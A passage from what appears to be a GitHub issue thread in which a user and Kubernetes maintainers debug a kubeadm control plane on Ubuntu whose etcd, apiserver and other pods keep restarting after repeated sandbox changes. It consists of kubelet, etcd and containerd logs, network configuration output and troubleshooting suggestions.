ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 24 18:20:26 master0 kubelet[518]: I0524 18:20:26.062780     518 status_manager.go:664] \"Failed to get status for pod\" podUID=07dc1079c410123fdbdd120d096c4f3e pod=\"kube-system/kube-controller-manager-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-controller-manager-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:26 master0 kubelet[518]: I0524 18:20:26.067179     518 status_manager.go:664] \"Failed to get status for pod\" podUID=3da0b3b3f5b168e56c71dd2c6212a28e pod=\"kube-system/etcd-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/etcd-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:26 master0 kubelet[518]: I0524 18:20:26.068141     518 status_manager.go:664] \"Failed to get status for pod\" podUID=f4e454d0-9316-4b44-92e9-498d8668a6fb pod=\"kube-system/kube-proxy-qzlw9\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-proxy-qzlw9\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:26 master0 kubelet[518]: I0524 18:20:26.068425     518 status_manager.go:664] \"Failed to get status for pod\" podUID=fa768acb94c6cd1f77a2619331162053 pod=\"kube-system/kube-scheduler-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-scheduler-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:26 master0 kubelet[518]: I0524 18:20:26.068696     518 status_manager.go:664] \"Failed to get status for pod\" podUID=7b1a28f140e1f4144f7bd4fae347b484 pod=\"kube-system/kube-apiserver-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-apiserver-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:26 master0 kubelet[518]: I0524 18:20:26.964016     518 scope.go:110] \"RemoveContainer\" containerID=\"f7229ae9be4f1419b961cb8ae3996c8bae34fbf205ac4a6498f3a60a21257421\"\r\nMay 24 18:20:26 master0 kubelet[518]: E0524 18:20:26.964838     518 pod_workers.go:951] \"Error syncing pod, skipping\" err=\"failed to \\\"StartContainer\\\" for \\\"kube-apiserver\\\" with CrashLoopBackOff: \\\"back-off 10s restarting failed container=kube-apiserver pod=kube-apiserver-master0_kube-system(7b1a28f140e1f4144f7bd4fae347b484)\\\"\" pod=\"kube-system/kube-apiserver-master0\" podUID=7b1a28f140e1f4144f7bd4fae347b484\r\nMay 24 18:20:27 master0 kubelet[518]: E0524 18:20:27.651236     518 controller.go:144] failed to ensure lease exists, will retry in 7s, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:30 master0 kubelet[518]: E0524 18:20:30.928371     518 kubelet.go:2344] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 24 18:20:31 master0 kubelet[518]: E0524 18:20:31.623305     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?resourceVersion=0&timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:31 master0 kubelet[518]: E0524 18:20:31.623641     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:31 master0 kubelet[518]: E0524 18:20:31.623854     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:31 master0 kubelet[518]: E0524 18:20:31.624135     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:31 master0 kubelet[518]: E0524 18:20:31.624360     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:31 master0 kubelet[518]: E0524 18:20:31.624382     518 kubelet_node_status.go:447] \"Unable to update node status\" err=\"update node status exceeds retry count\"\r\nMay 24 18:20:32 master0 kubelet[518]: I0524 18:20:32.342034     518 status_manager.go:664] \"Failed to get status for pod\" podUID=07dc1079c410123fdbdd120d096c4f3e pod=\"kube-system/kube-controller-manager-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-controller-manager-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:32 master0 kubelet[518]: I0524 18:20:32.342285     518 status_manager.go:664] \"Failed to get status for pod\" podUID=07dc1079c410123fdbdd120d096c4f3e pod=\"kube-system/kube-controller-manager-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-controller-manager-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:32 master0 kubelet[518]: E0524 18:20:32.833244     518 event.go:276] Unable to write event: '&v1.Event{TypeMeta:v1.TypeMeta{Kind:\"\", APIVersion:\"\"}, ObjectMeta:v1.ObjectMeta{Name:\"master0.16f21d7153d06a40\", GenerateName:\"\", Namespace:\"default\", SelfLink:\"\", UID:\"\", ResourceVersion:\"\", Generation:0, CreationTimestamp:time.Date(1, time.January, 1, 0, 0, 0, 0, time.UTC), DeletionTimestamp:<nil>, DeletionGracePeriodSeconds:(*int64)(nil), Labels:map[string]string(nil), Annotations:map[string]string(nil), OwnerReferences:[]v1.OwnerReference(nil), Finalizers:[]string(nil), ZZZ_DeprecatedClusterName:\"\", ManagedFields:[]v1.ManagedFieldsEntry(nil)}, InvolvedObject:v1.ObjectReference{Kind:\"Node\", Namespace:\"\", Name:\"master0\", UID:\"master0\", APIVersion:\"\", ResourceVersion:\"\", FieldPath:\"\"}, Reason:\"Starting\", Message:\"Starting kubelet.\", Source:v1.EventSource{Component:\"kubelet\", Host:\"master0\"}, FirstTimestamp:time.Date(2022, time.May, 24, 18, 19, 45, 773070912, time.Local), LastTimestamp:time.Date(2022, time.May, 24, 18, 19, 45, 773070912, time.Local), Count:1, Type:\"Normal\", EventTime:time.Date(1, time.January, 1, 0, 0, 0, 0, time.UTC), Series:(*v1.EventSeries)(nil), Action:\"\", Related:(*v1.ObjectReference)(nil), ReportingController:\"\", ReportingInstance:\"\"}': 'Post \"https://10.88.3.60:6443/api/v1/namespaces/default/events\": dial tcp 10.88.3.60:6443: connect: connection refused'(may retry after sleeping)\r\nMay 24 18:20:34 master0 kubelet[518]: E0524 18:20:34.652280     518 controller.go:144] failed to ensure lease exists, will retry in 7s, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:35 master0 kubelet[518]: E0524 18:20:35.929997     518 kubelet.go:2344] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 24 18:20:36 master0 kubelet[518]: I0524 18:20:36.060924     518 status_manager.go:664] \"Failed to get status for pod\" podUID=f4e454d0-9316-4b44-92e9-498d8668a6fb pod=\"kube-system/kube-proxy-qzlw9\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-proxy-qzlw9\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\n```\r\n\r\n</details>"}, {"author": "pacoxu", "body": "You cannot connect the apiserver from the node. There are two network interfaces.\r\n```\r\nsysctl -a | grep net.ipv4.conf.all.arp_filter\r\n```\r\n/sig network\r\nWould you check the route and arp_filter setting?"}, {"author": "Congelli501", "body": "Here are the arp_filter setting & routes:\r\n```\r\nroot@master0:~# sysctl -a | grep net.ipv4.conf.all.arp_filter\r\nnet.ipv4.conf.all.arp_filter = 0\r\n\r\nroot@master0:~# ip a\r\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\r\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\r\n    inet 127.0.0.1/8 scope host lo\r\n       valid_lft forever preferred_lft forever\r\n    inet6 ::1/128 scope host \r\n       valid_lft forever preferred_lft forever\r\n2: enp1s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\r\n    link/ether 52:54:00:8c:85:a9 brd ff:ff:ff:ff:ff:ff\r\n    inet 10.10.42.85/16 metric 100 brd 10.10.255.255 scope global dynamic enp1s0\r\n       valid_lft 39350sec preferred_lft 39350sec\r\n    inet6 fe80::5054:ff:fe8c:85a9/64 scope link \r\n       valid_lft forever preferred_lft forever\r\n3: enp2s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\r\n    link/ether 52:54:00:c4:0c:36 brd ff:ff:ff:ff:ff:ff\r\n    inet 10.88.3.60/16 brd 10.88.255.255 scope global enp2s0\r\n       valid_lft forever preferred_lft forever\r\n    inet6 fe80::5054:ff:fec4:c36/64 scope link \r\n       valid_lft forever preferred_lft forever\r\n\r\nroot@master0:~# ip r\r\ndefault via 10.10.0.3 dev enp1s0 proto dhcp src 10.10.42.85 metric 100 \r\n10.10.0.0/16 dev enp1s0 proto kernel scope link src 10.10.42.85 metric 100 \r\n10.10.0.1 dev enp1s0 proto dhcp scope link src 10.10.42.85 metric 100 \r\n10.10.0.3 dev enp1s0 proto dhcp scope link src 10.10.42.85 metric 100 \r\n10.88.0.0/16 dev enp2s0 proto kernel scope link src 10.88.3.60 \r\n```\r\n\r\nThe api server is accessible when it is UP, it just doesn't stay up for long.\r\n```\r\nroot@master0:~# while ! kubectl get pods -n kube-system; do sleep 5; done\r\nThe connection to the server 10.88.3.60:6443 was refused - did you specify the right host or port?\r\nThe connection to the server 10.88.3.60:6443 was refused - did you specify the right host or port?\r\nNAME                              READY   STATUS             RESTARTS          AGE\r\ncoredns-6d4b75cb6d-jfp4t          0/1     Pending            0                 47h\r\ncoredns-6d4b75cb6d-nmcmb          0/1     Pending            0                 47h\r\netcd-master0                      1/1     Running            559 (10m ago)     47h\r\nkube-apiserver-master0            0/1     Running            534 (24s ago)     47h\r\nkube-controller-manager-master0   0/1     Running            552 (3m23s ago)   47h\r\nkube-proxy-qzlw9                  0/1     CrashLoopBackOff   466 (5m28s ago)   47h\r\nkube-scheduler-master0            1/1     Running            555 (10m ago)     47h\r\n```\r\n\r\nAnd kubelet manage to talk to the api server as it tries to start the coredns pods (they are pending because of the lack of CNI, but their definition is only found in etcd).\r\n\r\nSame thing for `https://10.96.0.1:443`, `https://localhost:6443` and `https://10.88.3.60:6443`:\r\n```\r\nroot@master0:~# while ! curl -k 'https://10.96.0.1'; do sleep 5; done\r\ncurl: (7) Failed to connect to 10.96.0.1 port 443 after 16 ms: Connection refused\r\n...\r\ncurl: (7) Failed to connect to 10.96.0.1 port 443 after 17 ms: Connection refused\r\n{\r\n  \"kind\": \"Status\",\r\n  \"apiVersion\": \"v1\",\r\n  \"metadata\": {},\r\n  \"status\": \"Failure\",\r\n  \"message\": \"forbidden: User \\\"system:anonymous\\\" cannot get path \\\"/\\\"\",\r\n  \"reason\": \"Forbidden\",\r\n  \"details\": {},\r\n  \"code\": 403\r\n}\r\n```\r\n\r\n```\r\nroot@master0:~# while ! curl -k 'https://localhost:6443'; do sleep 1; done\r\ncurl: (7) Failed to connect to localhost port 6443 after 0 ms: Connection refused\r\n...\r\ncurl: (7) Failed to connect to localhost port 6443 after 0 ms: Connection refused\r\n{\r\n  \"kind\": \"Status\",\r\n  \"apiVersion\": \"v1\",\r\n  \"metadata\": {},\r\n  \"status\": \"Failure\",\r\n  \"message\": \"forbidden: User \\\"system:anonymous\\\" cannot get path \\\"/\\\"\",\r\n  \"reason\": \"Forbidden\",\r\n  \"details\": {},\r\n  \"code\": 403\r\n}\r\n```"}, {"author": "aojea", "body": "/remove sig-network\r\n\r\nremoving the label until is clear it belongs to sig-network, but the description says\r\n\r\n> The same install works without any problem under ubuntu focal (20.04)\r\n> The install is 100% automated (the only change is the ubuntu version)\r\n\r\nI don't know , but it sounds more like an environment problem ... check the logs of the apiserver to understand why is he exiting, maybe there is a hint there"}, {"author": "Congelli501", "body": "The api-server is killed by because it can't connect to etcd when it is down (so it fails its health check with a 500 error) and I can also see the `SandboxChanged` event too for the api server.\r\n\r\nThe etcd server doesn't crash, it is just constantly stopped and restarted. It seems to be caused by a `SandboxChanged` event, and it doesn't fail its health check.\r\n\r\n```\r\n  Normal   Created         115m (x163 over 16h)     kubelet  Created container etcd\r\n  Normal   Started         115m (x163 over 16h)     kubelet  Started container etcd\r\n  Warning  BackOff         34m (x2935 over 16h)     kubelet  Back-off restarting failed container\r\n  Normal   Killing         22m (x184 over 16h)      kubelet  Stopping container etcd\r\n  Normal   SandboxChanged  11m (x186 over 16h)      kubelet  Pod sandbox changed, it will be killed and re-created.\r\n  Normal   Pulled          11m (x183 over 16h)      kubelet  Container image \"k8s.gcr.io/etcd:3.5.3-0\" already present on machine\r\n```\r\n\r\nIn its logs, we can see that the etcd server was running fine for 3 minutes before beeing killed (it was up at `2022-05-26T10:41:46.837Z` and received a kill signal at `2022-05-26T10:44:35.558Z`).\r\n<details>\r\n```\r\nroot@master0:~# crictl -r unix:///run/containerd/containerd.sock logs 4fab77304c9b5\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:41:45.711Z\",\"caller\":\"etcdmain/etcd.go:73\",\"msg\":\"Running: \",\"args\":[\"etcd\",\"--advertise-client-urls=https://10.88.3.60:2379\",\"--cert-file=/etc/kubernetes/pki/etcd/server.crt\",\"--client-cert-auth=true\",\"--data-dir=/var/lib/etcd\",\"--experimental-initial-corrupt-check=true\",\"--initial-advertise-peer-urls=https://10.88.3.60:2380\",\"--initial-cluster=master0=https://10.88.3.60:2380\",\"--key-file=/etc/kubernetes/pki/etcd/server.key\",\"--listen-client-urls=https://127.0.0.1:2379,https://10.88.3.60:2379\",\"--listen-metrics-urls=http://127.0.0.1:2381\",\"--listen-peer-urls=https://10.88.3.60:2380\",\"--name=master0\",\"--peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt\",\"--peer-client-cert-auth=true\",\"--peer-key-file=/etc/kubernetes/pki/etcd/peer.key\",\"--peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt\",\"--snapshot-count=10000\",\"--trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt\"]}\r\n...\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:41:46.835Z\",\"caller\":\"etcdserver/server.go:2042\",\"msg\":\"published local member to cluster through raft\",\"local-member-id\":\"9d88ba3537208382\",\"local-member-attributes\":\"{Name:master0 ClientURLs:[https://10.88.3.60:2379]}\",\"request-path\":\"/0/members/9d88ba3537208382/attributes\",\"cluster-id\":\"92a615471ffeccdb\",\"publish-timeout\":\"7s\"}\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:41:46.835Z\",\"caller\":\"embed/serve.go:98\",\"msg\":\"ready to serve client requests\"}\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:41:46.835Z\",\"caller\":\"embed/serve.go:98\",\"msg\":\"ready to serve client requests\"}\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:41:46.835Z\",\"caller\":\"etcdmain/main.go:44\",\"msg\":\"notifying init daemon\"}\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:41:46.835Z\",\"caller\":\"etcdmain/main.go:50\",\"msg\":\"successfully notified init daemon\"}\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:41:46.837Z\",\"caller\":\"embed/serve.go:188\",\"msg\":\"serving client traffic securely\",\"address\":\"10.88.3.60:2379\"}\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:41:46.837Z\",\"caller\":\"embed/serve.go:188\",\"msg\":\"serving client traffic securely\",\"address\":\"127.0.0.1:2379\"}\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:44:35.558Z\",\"caller\":\"osutil/interrupt_unix.go:64\",\"msg\":\"received signal; shutting down\",\"signal\":\"terminated\"}\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:44:35.558Z\",\"caller\":\"embed/etcd.go:368\",\"msg\":\"closing etcd server\",\"name\":\"master0\",\"data-dir\":\"/var/lib/etcd\",\"advertise-peer-urls\":[\"https://10.88.3.60:2380\"],\"advertise-client-urls\":[\"https://10.88.3.60:2379\"]}\r\nWARNING: 2022/05/26 10:44:35 [core] grpc: addrConn.createTransport failed to connect to {10.88.3.60:2379 10.88.3.60:2379 <nil> 0 <nil>}. Err: connection error: desc = \"transport: Error while dialing dial tcp 10.88.3.60:2379: connect: connection refused\". Reconnecting...\r\nWARNING: 2022/05/26 10:44:35 [core] grpc: addrConn.createTransport failed to connect to {127.0.0.1:2379 127.0.0.1:2379 <nil> 0 <nil>}. Err: connection error: desc = \"transport: Error while dialing dial tcp 127.0.0.1:2379: connect: connection refused\". Reconnecting...\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:44:35.561Z\",\"caller\":\"etcdserver/server.go:1453\",\"msg\":\"skipped leadership transfer for single voting member cluster\",\"local-member-id\":\"9d88ba3537208382\",\"current-leader-member-id\":\"9d88ba3537208382\"}\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:44:35.571Z\",\"caller\":\"embed/etcd.go:563\",\"msg\":\"stopping serving peer traffic\",\"address\":\"10.88.3.60:2380\"}\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:44:35.572Z\",\"caller\":\"embed/etcd.go:568\",\"msg\":\"stopped serving peer traffic\",\"address\":\"10.88.3.60:2380\"}\r\n{\"level\":\"info\",\"ts\":\"2022-05-26T10:44:35.572Z\",\"caller\":\"embed/etcd.go:370\",\"msg\":\"closed etcd server\",\"name\":\"master0\",\"data-dir\":\"/var/lib/etcd\",\"advertise-peer-urls\":[\"https://10.88.3.60:2380\"],\"advertise-client-urls\":[\"https://10.88.3.60:2379\"]}\r\n```\r\n</details>\r\n\r\nThe kube-scheduler-master0 pod is crashing because it can't connect to the api server most of the time and is also getting the `SandboxChanged` event.\r\n\r\nI might be completely wrong about it, but it seems to me the root cause of all this is the `SandboxChanged` event that get fired constantly, making the pods restart. Every other errors (like the api server can't connect to etcd when it's down) just seem to be a consequence of it."}, {"author": "dcbw", "body": "@Congelli501 Kubelet logs sandbox change reasons at V(2) so if you can attach kubelet logs we should be able to figure out why it's killing/re-creating the sandbox."}, {"author": "dcbw", "body": "We should see at least one of these messages in kubelet logs:\r\n\r\n```\r\nklog.V(2).InfoS(\"No sandbox for pod can be found. Need to start a new one\", \"pod\", klog.KObj(pod))\r\nklog.V(2).InfoS(\"Multiple sandboxes are ready for Pod. Need to reconcile them\", \"pod\", klog.KObj(pod))\r\nklog.V(2).InfoS(\"No ready sandbox for pod can be found. Need to start a new one\", \"pod\", klog.KObj(pod))\r\nklog.V(2).InfoS(\"Sandbox for pod has changed. Need to start a new one\", \"pod\", klog.KObj(pod))\r\nklog.V(2).InfoS(\"Sandbox for pod has no IP address. Need to start a new one\", \"pod\", klog.KObj(pod))\r\n```"}, {"author": "Congelli501", "body": "My kubelet logs with `-v2` are indeed full of `No ready sandbox for pod can be found. Need to start a new one` messages:\r\n<details>\r\n\r\n```\r\n...\r\nMay 26 16:43:58 master0 kubelet[485]: I0526 16:43:58.743876     485 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/etcd-master0\"\r\nMay 26 16:44:06 master0 kubelet[485]: I0526 16:44:06.769150     485 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/kube-proxy-qzlw9\"\r\nMay 26 16:44:28 master0 kubelet[485]: I0526 16:44:28.806304     485 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/kube-scheduler-master0\"\r\nMay 26 16:45:54 master0 kubelet[485]: I0526 16:45:54.961485     485 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/kube-proxy-qzlw9\"\r\nMay 26 16:45:59 master0 kubelet[485]: I0526 16:45:59.981402     485 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/kube-scheduler-master0\"\r\nMay 26 16:46:14 master0 kubelet[485]: I0526 16:46:14.015592     485 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/kube-controller-manager-master0\"\r\nMay 26 16:46:27 master0 kubelet[485]: I0526 16:46:27.044067     485 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/kube-apiserver-master0\"\r\nMay 26 16:48:07 master0 kubelet[485]: I0526 16:48:07.223428     485 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/kube-proxy-qzlw9\"\r\nMay 26 16:48:59 master0 kubelet[485]: I0526 16:48:59.318984     485 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/kube-scheduler-master0\"\r\nMay 26 16:50:34 master0 kubelet[485]: I0526 16:50:34.480272     485 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/kube-proxy-qzlw9\"\r\nMay 26 16:50:57 master0 kubelet[485]: I0526 16:50:57.527808     485 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/etcd-master0\"\r\nMay 26 16:51:49 master0 kubelet[485]: I0526 16:51:49.629923     485 kuberuntime_manager.go:488] \"No ready sandbox for pod can be found. Need to start a new one\" pod=\"kube-system/kube-apiserver-master0\"\r\n```\r\n</details>\r\n\r\nTo limit the logs, I removed all but the etcd definition from `/etc/kubernetes/manifests`, and I see logs like these ones in the `containerd` logs when \"No ready sandbox for pod can be found. Need to start a new one\" is logged in kubelet:\r\n\r\n```\r\nMay 26 17:36:46 master0 containerd[402]: time=\"2022-05-26T17:36:46.004773741Z\" level=info msg=\"StopContainer for \\\"93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\\\" with timeout 30 (s)\"\r\nMay 26 17:36:46 master0 containerd[402]: time=\"2022-05-26T17:36:46.006107608Z\" level=info msg=\"Stop container \\\"93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\\\" with signal terminated\"\r\nMay 26 17:36:46 master0 containerd[402]: time=\"2022-05-26T17:36:46.060508850Z\" level=info msg=\"shim disconnected\" id=93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\r\nMay 26 17:36:46 master0 containerd[402]: time=\"2022-05-26T17:36:46.060559516Z\" level=warning msg=\"cleaning up after shim disconnected\" id=93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591 namespace=k8s.io\r\nMay 26 17:36:46 master0 containerd[402]: time=\"2022-05-26T17:36:46.072275065Z\" level=info msg=\"StopContainer for \\\"93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\\\" returns successfully\"\r\nMay 26 17:36:46 master0 containerd[402]: time=\"2022-05-26T17:36:46.072829105Z\" level=info msg=\"Container to stop \\\"93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\\\" must be in running or unknown state, current state \\\"CONTAINER_EXITED\\\"\"\r\nMay 26 17:36:46 master0 containerd[402]: time=\"2022-05-26T17:36:46.939190231Z\" level=info msg=\"Container to stop \\\"93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\\\" must be in running or unknown state, current state \\\"CONTAINER_EXITED\\\"\"\r\nMay 26 17:43:34 master0 containerd[402]: time=\"2022-05-26T17:43:34.136292727Z\" level=info msg=\"Container to stop \\\"93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\\\" must be in running or unknown state, current state \\\"CONTAINER_EXITED\\\"\"\r\nMay 26 17:43:34 master0 containerd[402]: time=\"2022-05-26T17:43:34.550325593Z\" level=info msg=\"RemoveContainer for \\\"93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\\\"\"\r\nMay 26 17:43:34 master0 containerd[402]: time=\"2022-05-26T17:43:34.550903234Z\" level=info msg=\"Container to stop \\\"93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\\\" must be in running or unknown state, current state \\\"CONTAINER_EXITED\\\"\"\r\nMay 26 17:43:34 master0 containerd[402]: time=\"2022-05-26T17:43:34.563524011Z\" level=info msg=\"RemoveContainer for \\\"93d2df37ce2e6a98fc9cc5773a486f60675eca29dc4a859752ec0b735c185591\\\" returns successfully\"\r\n```\r\n\r\n\r\nExtract of kubelet logs:\r\n<details>\r\n\r\n```\r\nMay 26 17:36:45 master0 kubelet[483]: E0526 17:36:45.036935     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:45 master0 kubelet[483]: E0526 17:36:45.137615     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:45 master0 kubelet[483]: I0526 17:36:45.157868     483 kubelet_node_status.go:352] \"Setting node annotation to enable volume controller attach/detach\"\r\nMay 26 17:36:45 master0 kubelet[483]: I0526 17:36:45.158963     483 kubelet_node_status.go:563] \"Recording event message for node\" node=\"master0\" event=\"NodeHasSufficientMemory\"\r\nMay 26 17:36:45 master0 kubelet[483]: I0526 17:36:45.159222     483 kubelet_node_status.go:563] \"Recording event message for node\" node=\"master0\" event=\"NodeHasNoDiskPressure\"\r\nMay 26 17:36:45 master0 kubelet[483]: I0526 17:36:45.159488     483 kubelet_node_status.go:563] \"Recording event message for node\" node=\"master0\" event=\"NodeHasSufficientPID\"\r\nMay 26 17:36:45 master0 kubelet[483]: I0526 17:36:45.159751     483 kubelet_node_status.go:70] \"Attempting to register node\" node=\"master0\"\r\nMay 26 17:36:45 master0 kubelet[483]: E0526 17:36:45.160429     483 kubelet_node_status.go:92] \"Unable to register node with API server\" err=\"Post \\\"https://10.88.3.60:6443/api/v1/nodes\\\": dial tcp 10.88.3.60:6443: connect: connection refused\" node=\"master0\"\r\nMay 26 17:36:45 master0 kubelet[483]: E0526 17:36:45.238120     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:45 master0 kubelet[483]: E0526 17:36:45.339013     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:45 master0 kubelet[483]: E0526 17:36:45.439231     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:45 master0 kubelet[483]: E0526 17:36:45.540013     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:45 master0 kubelet[483]: E0526 17:36:45.640659     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:45 master0 kubelet[483]: E0526 17:36:45.741337     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:45 master0 kubelet[483]: I0526 17:36:45.810357     483 csi_plugin.go:1063] Failed to contact API server when waiting for CSINode publishing: Get \"https://10.88.3.60:6443/apis/storage.k8s.io/v1/csinodes/master0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 26 17:36:45 master0 kubelet[483]: W0526 17:36:45.821036     483 reflector.go:324] vendor/k8s.io/client-go/informers/factory.go:134: failed to list *v1.Node: Get \"https://10.88.3.60:6443/api/v1/nodes?fieldSelector=metadata.name%3Dmaster0&limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 26 17:36:45 master0 kubelet[483]: E0526 17:36:45.821117     483 reflector.go:138] vendor/k8s.io/client-go/informers/factory.go:134: Failed to watch *v1.Node: failed to list *v1.Node: Get \"https://10.88.3.60:6443/api/v1/nodes?fieldSelector=metadata.name%3Dmaster0&limit=500&resourceVersion=0\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 26 17:36:45 master0 kubelet[483]: E0526 17:36:45.842186     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:45 master0 kubelet[483]: E0526 17:36:45.942992     483 kubelet.go:2419] \"Error getting node\" err=\"node \\\"master0\\\" not found\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.001778     483 kubelet_node_status.go:352] \"Setting node annotation to enable volume controller attach/detach\"\r\nMay 26 17:36:46 master0 kubelet[483]: I0526 17:36:46.002620     483 kubelet_node_status.go:563] \"Recording event message for node\" node=\"master0\" event=\"NodeHasSufficientMemory\"\r\nMay 26 17:36:46 master0 